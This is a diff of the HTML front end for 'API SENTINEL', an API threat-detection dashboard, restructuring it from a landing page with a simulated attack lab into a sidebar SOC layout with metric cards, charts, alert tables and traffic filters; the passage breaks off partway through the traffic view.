@@ -3,472 +3,1935 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>API SENTINEL | AI-Powered API Security & Threat Detection Platform</title>
+    <title>SOC Center | API SENTINEL</title>
 
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml" href="images/logo.svg">
     <!-- Bootstrap 5 CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <!-- Bootstrap Icons -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
     <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <!-- Custom SOC Cyber Stylesheet -->
+    <link rel="stylesheet" href="css/style.css">
     <!-- Chart.js -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.2/dist/chart.umd.min.js"></script>
-
-    <style>
-        :root {
-            --bg-primary: #050811;
-            --bg-card: rgba(12, 19, 36, 0.85);
-            --bg-elevated: #152238;
-            --accent-cyan: #00f0ff;
-            --accent-blue: #3b82f6;
-            --accent-purple: #a855f7;
-            --threat-safe: #00f59b;
-            --threat-medium: #ffb703;
-            --threat-critical: #ff2e63;
-            --border-color: rgba(30, 58, 95, 0.5);
-            --font-mono: "Fira Code", monospace;
-            --font-sans: "Inter", sans-serif;
-        }
-        body {
-            font-family: var(--font-sans);
-            background-color: var(--bg-primary);
-            color: #f8fafc;
-            line-height: 1.6;
-            background-image: 
-                radial-gradient(circle at 12% 15%, rgba(0, 240, 255, 0.08) 0%, transparent 40%),
-                radial-gradient(circle at 88% 20%, rgba(168, 85, 247, 0.07) 0%, transparent 45%),
-                linear-gradient(to right, rgba(255, 255, 255, 0.02) 1px, transparent 1px),
-                linear-gradient(to bottom, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
-            background-size: 100% 100%, 100% 100%, 36px 36px, 36px 36px;
-            background-attachment: fixed;
-        }
-        .cyber-laser-line {
-            position: fixed;
-            top: 0; left: 0; right: 0; height: 2px;
-            background: linear-gradient(90deg, transparent, var(--accent-cyan), var(--accent-purple), var(--threat-safe), transparent);
-            z-index: 2000;
-            box-shadow: 0 0 12px var(--accent-cyan);
-        }
-        .font-mono { font-family: var(--font-mono); }
-        .text-cyan { color: var(--accent-cyan) !important; text-shadow: 0 0 8px rgba(0, 240, 255, 0.4); }
-        .text-emerald { color: var(--threat-safe) !important; text-shadow: 0 0 8px rgba(0, 245, 155, 0.4); }
-        .text-amber { color: var(--threat-medium) !important; text-shadow: 0 0 8px rgba(255, 183, 3, 0.4); }
-        .text-crimson { color: var(--threat-critical) !important; text-shadow: 0 0 10px rgba(255, 46, 99, 0.5); }
-        
-        .soc-card {
-            background-color: var(--bg-card);
-            backdrop-filter: blur(16px);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 1.35rem;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            transition: all 0.25s ease;
-        }
-        .soc-card:hover {
-            border-color: rgba(0, 240, 255, 0.45);
-            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.6), 0 0 20px rgba(0, 240, 255, 0.12);
-        }
-        .kpi-card {
-            padding: 1.35rem;
-            border-radius: 14px;
-            background-color: var(--bg-card);
-            backdrop-filter: blur(16px);
-            border: 1px solid var(--border-color);
-            position: relative;
-            overflow: hidden;
-            transition: all 0.25s ease;
-        }
-        .kpi-card:hover {
-            transform: translateY(-3px);
-            border-color: rgba(0, 240, 255, 0.5);
-        }
-        .kpi-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 3px;
-        }
-        .kpi-cyan::before { background: var(--accent-cyan); box-shadow: 0 0 12px var(--accent-cyan); }
-        .kpi-green::before { background: var(--threat-safe); box-shadow: 0 0 12px var(--threat-safe); }
-        .kpi-amber::before { background: var(--threat-medium); box-shadow: 0 0 12px var(--threat-medium); }
-        .kpi-red::before { background: var(--threat-critical); box-shadow: 0 0 12px var(--threat-critical); }
-
-        .btn-cyber {
-            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
-            color: #050811;
-            font-weight: 800;
-            border: none;
-            border-radius: 10px;
-            padding: 0.6rem 1.35rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.55rem;
-            transition: all 0.25s ease;
-            box-shadow: 0 0 15px rgba(0, 240, 255, 0.35);
-        }
-        .btn-cyber:hover {
-            box-shadow: 0 0 25px rgba(0, 240, 255, 0.6);
-            color: #000;
-            transform: translateY(-2px);
-        }
-        .btn-cyber-outline {
-            background: rgba(0, 240, 255, 0.05);
-            color: var(--accent-cyan);
-            border: 1px solid rgba(0, 240, 255, 0.45);
-            font-weight: 700;
-            border-radius: 10px;
-            padding: 0.6rem 1.35rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.55rem;
-        }
-        .btn-cyber-outline:hover {
-            background: rgba(0, 240, 255, 0.15);
-            color: #ffffff;
-            border-color: var(--accent-cyan);
-            box-shadow: 0 0 18px rgba(0, 240, 255, 0.3);
-        }
-
-        /* Radar Scope Styling */
-        .radar-scope-wrapper {
-            position: relative;
-            width: 130px;
-            height: 130px;
-            margin: 0 auto;
-        }
-        .radar-scope {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(0, 240, 255, 0.12) 0%, rgba(5, 8, 17, 0.95) 70%);
-            border: 2px solid rgba(0, 240, 255, 0.4);
-            position: relative;
-            box-shadow: 0 0 20px rgba(0, 240, 255, 0.25);
-            overflow: hidden;
-        }
-        .radar-ring {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            border-radius: 50%;
-            border: 1px dashed rgba(0, 240, 255, 0.25);
-        }
-        .radar-ring.r1 { width: 40%; height: 40%; }
-        .radar-ring.r2 { width: 70%; height: 70%; }
-        .radar-crosshair-h {
-            position: absolute; top: 50%; left: 0; right: 0; height: 1px;
-            background: rgba(0, 240, 255, 0.2);
-        }
-        .radar-crosshair-v {
-            position: absolute; left: 50%; top: 0; bottom: 0; width: 1px;
-            background: rgba(0, 240, 255, 0.2);
-        }
-        .radar-sweep {
-            position: absolute; top: 50%; left: 50%; width: 50%; height: 50%;
-            transform-origin: 0% 0%;
-            background: linear-gradient(45deg, rgba(0, 240, 255, 0.45) 0%, transparent 60%);
-            border-top: 2px solid var(--accent-cyan);
-            animation: radar-spin 3s linear infinite;
-            border-radius: 100% 0 0 0;
-        }
-        @keyframes radar-spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        .radar-blip {
-            position: absolute;
-            width: 6px; height: 6px;
-            border-radius: 50%;
-            background: var(--threat-critical);
-            box-shadow: 0 0 8px var(--threat-critical);
-            animation: blip-pulse 1.5s infinite;
-        }
-        @keyframes blip-pulse {
-            0% { opacity: 0.2; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.3); }
-            100% { opacity: 0.2; transform: scale(0.8); }
-        }
-
-        .simulation-console {
-            background-color: #03060d;
-            border: 1px solid rgba(0, 240, 255, 0.3);
-            border-radius: 10px;
-            padding: 1.15rem;
-            font-family: var(--font-mono);
-            font-size: 0.85rem;
-            color: #38bdf8;
-            height: 250px;
-            overflow-y: auto;
-            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.8);
-        }
-    </style>
 </head>
-<body>
+<body class="cyber-grid-bg">
+    <!-- Top Cyber Laser Scanline -->
     <div class="cyber-laser-line"></div>
 
-    <!-- Navigation Header -->
-    <nav class="navbar navbar-dark bg-dark bg-opacity-75 border-bottom border-secondary sticky-top px-3">
-        <div class="container-fluid">
-            <a class="navbar-brand d-flex align-items-center gap-2" href="#">
-                <span class="badge bg-primary text-black p-2 rounded-3 shadow"><i class="bi bi-shield-shaded fs-5"></i></span>
-                <div>
-                    <span class="fw-bold tracking-wide">API SENTINEL</span>
-                    <span class="d-none d-md-inline-block small text-cyan ms-2">Intelligent API Protection. Real-Time Threat Detection.</span>
+    <div class="app-layout">
+        <!-- Sidebar Navigation -->
+        <aside class="app-sidebar">
+            <div class="sidebar-brand">
+                <div class="brand-icon">
+                    <i class="bi bi-shield-shaded"></i>
                 </div>
-            </a>
-            <div class="d-flex align-items-center gap-2">
-                <a href="https://github.com/brshirisha27-cloud/api-sentinel-ai-security" target="_blank" class="btn btn-sm btn-cyber-outline">
-                    <i class="bi bi-github"></i> GitHub Repository
+                <div>
+                    <div class="brand-title">API SENTINEL</div>
+                    <div class="text-muted" style="font-size: 0.65rem; letter-spacing: 0.08em; font-weight: 600;">AI THREAT INTELLIGENCE</div>
+                </div>
+            </div>
+
+            <div class="sidebar-menu">
+                <div class="menu-category">Threat Operations</div>
+                <div class="nav-item">
+                    <a href="javascript:void(0)" onclick="switchTab('dashboard')" id="nav-dashboard" class="nav-link active">
+                        <i class="bi bi-speedometer2"></i>
+                        <span>SOC Dashboard</span>
+                    </a>
+                </div>
+                <div class="nav-item">
+                    <a href="javascript:void(0)" onclick="switchTab('traffic')" id="nav-traffic" class="nav-link">
+                        <i class="bi bi-activity"></i>
+                        <span>Traffic Monitoring</span>
+                    </a>
+                </div>
+                <div class="nav-item">
+                    <a href="javascript:void(0)" onclick="switchTab('alerts')" id="nav-alerts" class="nav-link">
+                        <i class="bi bi-shield-exclamation"></i>
+                        <span>Threat Alerts</span>
+                    </a>
+                </div>
+
+                <div class="menu-category">Offensive & Defensive AI</div>
+                <div class="nav-item">
+                    <a href="javascript:void(0)" onclick="switchTab('simulation')" id="nav-simulation" class="nav-link">
+                        <i class="bi bi-lightning-charge"></i>
+                        <span>Simulation Lab</span>
+                    </a>
+                </div>
+                <div class="nav-item">
+                    <a href="javascript:void(0)" onclick="switchTab('models')" id="nav-models" class="nav-link">
+                        <i class="bi bi-cpu"></i>
+                        <span>AI / ML Models</span>
+                    </a>
+                </div>
+                <div class="nav-item">
+                    <a href="javascript:void(0)" onclick="switchTab('logs')" id="nav-logs" class="nav-link">
+                        <i class="bi bi-journal-text"></i>
+                        <span>Audit Event Logs</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Sidebar Status Card -->
+            <div class="sidebar-status-box">
+                <div class="d-flex align-items-center justify-content-between mb-2">
+                    <span class="small text-muted fw-bold">DETECTION ENGINE</span>
+                    <span id="engineHealthBadge" class="status-beacon active" title="Engine Active"></span>
+                </div>
+                <div class="small text-cyan font-mono" style="font-size: 0.75rem;">RF + Isolation Forest</div>
+                <div class="small text-muted" style="font-size: 0.7rem;">Dual-model real-time pipeline</div>
+            </div>
+
+            <!-- Current User & Role -->
+            <div class="p-3 border-top border-secondary bg-dark bg-opacity-50 d-flex align-items-center justify-content-between">
+                <div class="d-flex align-items-center gap-2 overflow-hidden">
+                    <div class="rounded-circle bg-secondary d-flex align-items-center justify-content-center text-cyan fw-bold" style="width: 32px; height: 32px; flex-shrink: 0;">
+                        A
+                    </div>
+                    <div class="text-truncate">
+                        <div class="small fw-bold text-white text-truncate">Chief Security Officer</div>
+                        <div class="text-muted" style="font-size: 0.7rem;">SOC Administrator</div>
+                    </div>
+                </div>
+                <a href="https://github.com/brshirisha27-cloud/api-sentinel-ai-security" target="_blank" class="text-cyan p-1" title="GitHub Repository">
+                    <i class="bi bi-github fs-5"></i>
                 </a>
             </div>
-        </div>
-    </nav>
+        </aside>
 
-    <!-- Hero Showcase Section -->
-    <div class="container py-5">
-        <div class="row align-items-center mb-5">
-            <div class="col-lg-8">
-                <div class="badge bg-dark border border-secondary text-cyan font-mono mb-3 py-2 px-3">
-                    <i class="bi bi-broadcast me-1"></i> SOC THREAT INTELLIGENCE &amp; API MONITORING
+        <!-- Main Content Area -->
+        <main class="app-main">
+            <!-- Top Navigation Bar -->
+            <header class="app-topbar">
+                <div class="d-flex align-items-center gap-3">
+                    <button id="sidebarToggleBtn" class="btn btn-dark d-lg-none text-light py-1 px-2 border-secondary">
+                        <i class="bi bi-list fs-5"></i>
+                    </button>
+                    
+                    <div id="threatLevelBadge" class="threat-banner-badge elevated">
+                        <i class="bi bi-broadcast"></i>
+                        <span>STATUS:</span>
+                        <span id="threatLevelText" class="font-mono">MONITORING</span>
+                    </div>
+
+                    <div id="socClock" class="d-none d-md-block small text-muted font-mono ms-2"></div>
                 </div>
-                <h1 class="display-4 fw-extrabold text-white mb-3">
-                    AI-Powered API Security &amp; <span class="text-cyan">Intelligent Threat Detection</span>
-                </h1>
-                <p class="lead text-muted mb-4">
-                    An enterprise-grade Security Operations Center (SOC) platform leveraging dual-model machine learning
-                    (Random Forest + Isolation Forest) to monitor API traffic, identify zero-day attacks, and execute automated mitigation.
-                </p>
-                <div class="d-flex flex-wrap gap-2">
-                    <a href="#demoSection" class="btn btn-cyber">
-                        <i class="bi bi-play-circle-fill"></i> Test Interactive Attack Lab
-                    </a>
-                    <a href="https://github.com/brshirisha27-cloud/api-sentinel-ai-security" target="_blank" class="btn btn-cyber-outline">
-                        <i class="bi bi-code-slash"></i> View Python Flask Source
-                    </a>
+
+                <div class="d-flex align-items-center gap-2">
+                    <button onclick="switchTab('simulation')" class="btn btn-sm btn-cyber d-none d-sm-inline-flex">
+                        <i class="bi bi-play-circle-fill"></i> Attack Simulator
+                    </button>
+                    <button class="btn btn-sm btn-cyber-outline" data-bs-toggle="modal" data-bs-target="#quickSimModal">
+                        <i class="bi bi-crosshair"></i> Quick Test
+                    </button>
                 </div>
-            </div>
-            <div class="col-lg-4 text-center mt-4 mt-lg-0">
-                <div class="p-4 rounded-4 soc-card">
-                    <div class="text-muted small fw-bold mb-2">LIVE THREAT RADAR</div>
-                    <div class="radar-scope-wrapper mb-3">
-                        <div class="radar-scope">
-                            <div class="radar-ring r1"></div>
-                            <div class="radar-ring r2"></div>
-                            <div class="radar-crosshair-h"></div>
-                            <div class="radar-crosshair-v"></div>
-                            <div class="radar-sweep"></div>
-                            <div class="radar-blip" style="top: 30%; left: 65%;"></div>
-                            <div class="radar-blip" style="top: 72%; left: 35%; background: #ffb703; box-shadow: 0 0 8px #ffb703;"></div>
+            </header>
+
+            <!-- Page Body Content -->
+            <div class="page-content">
+
+                <!-- ========================================== -->
+                <!-- 1. SOC DASHBOARD VIEW                      -->
+                <!-- ========================================== -->
+                <section id="view-dashboard">
+                    <div class="d-flex flex-wrap justify-content-between align-items-center mb-4">
+                        <div>
+                            <h3 class="fw-bold text-white mb-0">Security Operations Center</h3>
+                            <p class="text-muted small mb-0">Real-time API telemetry, machine learning threat classification, and active mitigation</p>
+                        </div>
+                        <div class="d-flex align-items-center gap-2 mt-2 mt-sm-0">
+                            <button onclick="refreshDashboard()" class="btn btn-sm btn-cyber-outline">
+                                <i class="bi bi-arrow-clockwise"></i> Refresh Telemetry
+                            </button>
+                            <button onclick="switchTab('simulation')" class="btn btn-sm btn-cyber">
+                                <i class="bi bi-lightning-charge-fill"></i> Launch Simulation Lab
+                            </button>
                         </div>
                     </div>
-                    <div class="badge bg-success bg-opacity-25 border border-success text-emerald font-mono py-2 px-3">
-                        <i class="bi bi-shield-check me-1"></i> DEFCON 5: NORMAL BASELINE
+
+                    <!-- KPI Metric Cards -->
+                    <div class="row g-3 mb-4">
+                        <div class="col-6 col-lg-3">
+                            <div class="kpi-card kpi-cyan">
+                                <div class="kpi-header">
+                                    <span>Total Monitored</span>
+                                    <div class="kpi-icon-wrap kpi-icon-cyan"><i class="bi bi-activity"></i></div>
+                                </div>
+                                <div class="kpi-value text-cyan" id="kpiTotalRequests">0</div>
+                                <div class="kpi-subtext"><i class="bi bi-arrow-up-right text-cyan"></i> Inbound HTTP Telemetry</div>
+                            </div>
+                        </div>
+
+                        <div class="col-6 col-lg-3">
+                            <div class="kpi-card kpi-green">
+                                <div class="kpi-header">
+                                    <span>Safe Traffic</span>
+                                    <div class="kpi-icon-wrap kpi-icon-green"><i class="bi bi-shield-check"></i></div>
+                                </div>
+                                <div class="kpi-value text-emerald" id="kpiSafeRequests">0</div>
+                                <div class="kpi-subtext"><i class="bi bi-check-circle-fill text-emerald"></i> Normal Behavioral Baseline</div>
+                            </div>
+                        </div>
+
+                        <div class="col-6 col-lg-3">
+                            <div class="kpi-card kpi-amber">
+                                <div class="kpi-header">
+                                    <span>Suspicious Events</span>
+                                    <div class="kpi-icon-wrap kpi-icon-amber"><i class="bi bi-exclamation-triangle"></i></div>
+                                </div>
+                                <div class="kpi-value text-amber" id="kpiSuspiciousRequests">0</div>
+                                <div class="kpi-subtext"><i class="bi bi-eye-fill text-amber"></i> Flagged for Behavioral Triage</div>
+                            </div>
+                        </div>
+
+                        <div class="col-6 col-lg-3">
+                            <div class="kpi-card kpi-red">
+                                <div class="kpi-header">
+                                    <span>Blocked Threats</span>
+                                    <div class="kpi-icon-wrap kpi-icon-red"><i class="bi bi-shield-slash"></i></div>
+                                </div>
+                                <div class="kpi-value text-crimson" id="kpiBlockedRequests">0</div>
+                                <div class="kpi-subtext"><i class="bi bi-slash-circle-fill text-crimson"></i> Dropped & Blocked at WAF</div>
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        </div>
 
-        <!-- KPI Metrics Grid -->
-        <div class="row g-3 mb-5">
-            <div class="col-6 col-lg-3">
-                <div class="kpi-card kpi-cyan">
-                    <div class="small text-muted fw-bold">TOTAL REQUESTS</div>
-                    <div class="h2 text-cyan font-mono my-1" id="kpiTotal">1,482</div>
-                    <div class="small text-muted">All monitored telemetry</div>
-                </div>
-            </div>
-            <div class="col-6 col-lg-3">
-                <div class="kpi-card kpi-green">
-                    <div class="small text-muted fw-bold">SAFE REQUESTS</div>
-                    <div class="h2 text-emerald font-mono my-1" id="kpiSafe">1,390</div>
-                    <div class="small text-muted">Normal operations (93.8%)</div>
-                </div>
-            </div>
-            <div class="col-6 col-lg-3">
-                <div class="kpi-card kpi-amber">
-                    <div class="small text-muted fw-bold">SUSPICIOUS EVENTS</div>
-                    <div class="h2 text-amber font-mono my-1" id="kpiSuspicious">68</div>
-                    <div class="small text-muted">Flagged for SOC review</div>
-                </div>
-            </div>
-            <div class="col-6 col-lg-3">
-                <div class="kpi-card kpi-red">
-                    <div class="small text-muted fw-bold">BLOCKED THREATS</div>
-                    <div class="h2 text-crimson font-mono my-1" id="kpiBlocked">24</div>
-                    <div class="small text-muted">Dropped at API Gateway</div>
-                </div>
-            </div>
-        </div>
+                    <!-- Threat Radar & Charts Row -->
+                    <div class="row g-3 mb-4">
+                        <!-- Radar Scope -->
+                        <div class="col-lg-4">
+                            <div class="soc-card h-100 d-flex flex-column justify-content-between">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title">
+                                        <i class="bi bi-radar text-cyan"></i>
+                                        <span>Live Threat Radar Scope</span>
+                                    </div>
+                                    <span class="badge bg-dark border border-secondary text-cyan font-mono small">360° Sweep</span>
+                                </div>
+                                <div class="py-2 text-center">
+                                    <div class="radar-scope-wrapper">
+                                        <div class="radar-scope">
+                                            <div class="radar-ring r1"></div>
+                                            <div class="radar-ring r2"></div>
+                                            <div class="radar-crosshair-h"></div>
+                                            <div class="radar-crosshair-v"></div>
+                                            <div class="radar-sweep"></div>
+                                            <div class="radar-blip" style="top: 28%; left: 68%;"></div>
+                                            <div class="radar-blip" style="top: 72%; left: 32%; background: #ffb703; box-shadow: 0 0 8px #ffb703;"></div>
+                                            <div class="radar-blip" style="top: 48%; left: 18%; background: #00f0ff; box-shadow: 0 0 8px #00f0ff;"></div>
+                                        </div>
+                                    </div>
+                                    <div class="mt-3">
+                                        <span class="badge bg-success bg-opacity-25 border border-success text-emerald font-mono small py-1 px-3">
+                                            <i class="bi bi-shield-check me-1"></i> ACTIVE BEHAVIORAL SONAR
+                                        </span>
+                                    </div>
+                                </div>
+                                <div class="border-top border-secondary pt-2 mt-2 d-flex justify-content-between align-items-center small font-mono">
+                                    <span class="text-muted">Sonar: <strong class="text-cyan">Sweep 3.0s</strong></span>
+                                    <span class="text-muted">Anomaly Index: <strong class="text-emerald">LOW</strong></span>
+                                </div>
+                            </div>
+                        </div>
 
-        <!-- Interactive Attack Simulation Lab Section -->
-        <div id="demoSection" class="soc-card mb-5 p-4">
-            <div class="d-flex justify-content-between align-items-center mb-3">
-                <div>
-                    <h4 class="text-white fw-bold mb-1"><i class="bi bi-lightning-charge-fill text-cyan me-2"></i>Interactive Adversarial Attack Lab</h4>
-                    <p class="small text-muted mb-0">Simulate attack scenarios below to test the AI risk scoring algorithms in real time:</p>
-                </div>
-                <span class="badge bg-dark border border-secondary text-cyan font-mono">Interactive Demo</span>
-            </div>
+                        <!-- Traffic Timeline Chart -->
+                        <div class="col-lg-5">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title">
+                                        <i class="bi bi-graph-up text-cyan"></i>
+                                        <span>Real-Time Traffic Activity & Risk Score</span>
+                                    </div>
+                                    <div class="badge bg-dark border border-secondary text-cyan font-mono small">
+                                        <i class="bi bi-broadcast me-1"></i> Live Stream
+                                    </div>
+                                </div>
+                                <div style="height: 250px; position: relative;">
+                                    <canvas id="trafficTimelineChart"></canvas>
+                                </div>
+                            </div>
+                        </div>
 
-            <div class="row g-2 mb-4">
-                <div class="col-md-3">
-                    <button class="btn btn-outline-success w-100 py-2 text-start font-mono small" onclick="runClientSim('normal')">
-                        <i class="bi bi-check-circle me-1"></i> Normal Traffic
-                    </button>
-                </div>
-                <div class="col-md-3">
-                    <button class="btn btn-outline-danger w-100 py-2 text-start font-mono small" onclick="runClientSim('brute_force')">
-                        <i class="bi bi-key me-1"></i> Brute Force Attack
-                    </button>
-                </div>
-                <div class="col-md-3">
-                    <button class="btn btn-outline-warning w-100 py-2 text-start font-mono small" onclick="runClientSim('dos')">
-                        <i class="bi bi-speedometer2 me-1"></i> DoS Traffic Spike
-                    </button>
-                </div>
-                <div class="col-md-3">
-                    <button class="btn btn-outline-danger w-100 py-2 text-start font-mono small" onclick="runClientSim('sqli')">
-                        <i class="bi bi-code-slash me-1"></i> SQLi Injection
-                    </button>
-                </div>
-            </div>
-
-            <!-- Simulation Console & Real-Time Chart -->
-            <div class="row g-3">
-                <div class="col-lg-6">
-                    <div class="small text-muted fw-bold mb-2 font-mono"><i class="bi bi-terminal me-1"></i>Live Telemetry Stream:</div>
-                    <div id="demoConsole" class="simulation-console">
-                        <div>[SYSTEM] API Sentinel detection engine initialized.</div>
-                        <div class="text-cyan">[READY] Click any simulation button above to dispatch synthetic API packets.</div>
+                        <!-- Threat Categories Doughnut -->
+                        <div class="col-lg-3">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title">
+                                        <i class="bi bi-pie-chart-fill text-amber"></i>
+                                        <span>Threat Categories</span>
+                                    </div>
+                                    <div class="badge bg-dark border border-secondary text-muted font-mono small">
+                                        Distribution
+                                    </div>
+                                </div>
+                                <div style="height: 200px; position: relative;">
+                                    <canvas id="threatCategoryChart"></canvas>
+                                </div>
+                                <div class="border-top border-secondary pt-2 mt-2 d-flex justify-content-between align-items-center small font-mono">
+                                    <span class="text-muted">Alerts: <strong class="text-white" id="kpiActiveAlerts">0</strong></span>
+                                    <span class="text-muted">Avg Latency: <strong class="text-amber" id="kpiAvgLatency">0 ms</strong></span>
+                                </div>
+                            </div>
+                        </div>
                     </div>
-                </div>
-                <div class="col-lg-6">
-                    <div class="small text-muted fw-bold mb-2 font-mono"><i class="bi bi-graph-up me-1"></i>Risk Score Activity Timeline:</div>
-                    <div style="height: 250px; position: relative;">
-                        <canvas id="demoChart"></canvas>
-                    </div>
-                </div>
-            </div>
-        </div>
 
-        <!-- Academic Technology & Architecture Overview -->
-        <div class="row g-4 mb-5">
-            <div class="col-md-6">
-                <div class="soc-card h-100">
-                    <h5 class="fw-bold text-white mb-3"><i class="bi bi-cpu text-cyan me-2"></i>Machine Learning Dual-Engine</h5>
-                    <ul class="list-unstyled small text-muted">
-                        <li class="mb-2"><strong class="text-white">Model 1: Random Forest Classifier</strong> — 100 decision trees classifying requests into Normal (0), Suspicious (1), and Potential Attack (2) across 8 behavioral metrics.</li>
-                        <li class="mb-2"><strong class="text-white">Model 2: Isolation Forest</strong> — Unsupervised anomaly detection isolating out-of-distribution traffic vectors to discover zero-day attacks.</li>
-                        <li><strong class="text-white">Composite Risk Scoring</strong> — Combines classification probabilities, multivariate outlier distance, and deterministic heuristics into a transparent 0–100 risk score.</li>
-                    </ul>
-                </div>
-            </div>
-            <div class="col-md-6">
-                <div class="soc-card h-100">
-                    <h5 class="fw-bold text-white mb-3"><i class="bi bi-terminal-split text-cyan me-2"></i>How to Run Locally</h5>
-                    <div class="p-3 rounded bg-black border border-secondary font-mono small text-light mb-2">
-                        <div>git clone https://github.com/brshirisha27-cloud/api-sentinel-ai-security.git</div>
-                        <div>cd api-sentinel-ai-security</div>
-                        <div>pip install -r requirements.txt</div>
-                        <div class="text-cyan">python app.py</div>
-                    </div>
-                    <div class="small text-muted">
-                        Runs locally on <code>http://127.0.0.1:5000</code> with a persistent SQLite database and interactive SOC dashboard.
-                    </div>
-                </div>
-            </div>
-        </div>
+                    <!-- Incidents & Traffic Feeds -->
+                    <div class="row g-3">
+                        <div class="col-lg-6">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title">
+                                        <i class="bi bi-shield-exclamation text-crimson"></i>
+                                        <span>Recent Security Incidents & Threat Alerts</span>
+                                    </div>
+                                    <button onclick="switchTab('alerts')" class="btn btn-sm btn-cyber-outline py-0 px-2 small">
+                                        View All <i class="bi bi-arrow-right"></i>
+                                    </button>
+                                </div>
+                                <div class="table-soc-container">
+                                    <table class="table-soc">
+                                        <thead>
+                                            <tr>
+                                                <th>Severity</th>
+                                                <th>Incident Title</th>
+                                                <th>Source IP</th>
+                                                <th>Risk Score</th>
+                                                <th class="text-end">Action</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody id="recentAlertsTbody"></tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
 
-        <!-- Footer -->
-        <footer class="text-center py-4 border-top border-secondary text-muted small">
-            <div><strong>API SENTINEL</strong> &bull; AI-Powered API Security Platform</div>
-            <div class="mt-1">Built with Python Flask, Scikit-learn, SQLite, Bootstrap 5, and Chart.js</div>
-            <div class="mt-2">
-                <a href="https://github.com/brshirisha27-cloud/api-sentinel-ai-security" target="_blank" class="text-cyan text-decoration-none">
-                    <i class="bi bi-github me-1"></i> github.com/brshirisha27-cloud/api-sentinel-ai-security
-                </a>
+                        <div class="col-lg-6">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title">
+                                        <i class="bi bi-hdd-network text-cyan"></i>
+                                        <span>Live Inbound Request Stream</span>
+                                    </div>
+                                    <button onclick="switchTab('traffic')" class="btn btn-sm btn-cyber-outline py-0 px-2 small">
+                                        Explore Traffic <i class="bi bi-arrow-right"></i>
+                                    </button>
+                                </div>
+                                <div class="table-soc-container">
+                                    <table class="table-soc">
+                                        <thead>
+                                            <tr>
+                                                <th>Method</th>
+                                                <th>Endpoint</th>
+                                                <th>IP</th>
+                                                <th>Status</th>
+                                                <th>AI Class</th>
+                                                <th class="text-end">Risk</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody id="recentRequestsTbody"></tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+
+                <!-- ========================================== -->
+                <!-- 2. TRAFFIC MONITORING VIEW                 -->
+                <!-- ========================================== -->
+                <section id="view-traffic" class="d-none">
+                    <div class="d-flex flex-wrap justify-content-between align-items-center mb-4">
+                        <div>
+                            <h3 class="fw-bold text-white mb-0">API Traffic Telemetry & Packet Inspection</h3>
+                            <p class="text-muted small mb-0">Detailed event log of monitored API endpoints, latency metrics, and real-time AI risk evaluation</p>
+                        </div>
+                        <div class="d-flex align-items-center gap-2 mt-2 mt-sm-0">
+                            <button class="btn btn-sm btn-cyber" data-bs-toggle="modal" data-bs-target="#customRequestModal">
+                                <i class="bi bi-send-plus"></i> Ingest Custom Request
+                            </button>
+                            <button onclick="renderTrafficTable()" class="btn btn-sm btn-cyber-outline">
+                                <i class="bi bi-arrow-clockwise"></i> Refresh
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Search & Filter Controls -->
+                    <div class="soc-card mb-4 p-3">
+                        <div class="row g-2 align-items-center">
+                            <div class="col-md-4">
+                                <div class="input-group">
+                                    <span class="input-group-text bg-black border-secondary text-cyan"><i class="bi bi-search"></i></span>
+                                    <input type="text" id="trafficSearch" class="form-control form-control-cyber" placeholder="Search by ID, IP, endpoint, threat..." oninput="filterTraffic()">
+                                </div>
+                            </div>
+                            <div class="col-6 col-md-2">
+                                <select id="methodFilter" class="form-select form-select-cyber" onchange="filterTraffic()">
+                                    <option value="ALL">All Methods</option>
+                                    <option value="GET">GET</option>
+                                    <option value="POST">POST</option>
+                                    <option value="PUT">PUT</option>
+                                    <option value="DELETE">DELETE</option>
+                                </select>
+                            </div>
+                            <div class="col-6 col-md-3">
+                                <select id="classFilter" class="form-select form-select-cyber" onchange="filterTraffic()">
+                                    <option value="ALL">All Classifications</option>
+                                    <option value="Normal">Normal Traffic</option>
+                                    <option value="Suspicious">Suspicious</option>
+                                    <option value="Potential Attack">Potential Attack</option>
+                                </select>
+                            </div>
+                            <div class="col-6 col-md-2">
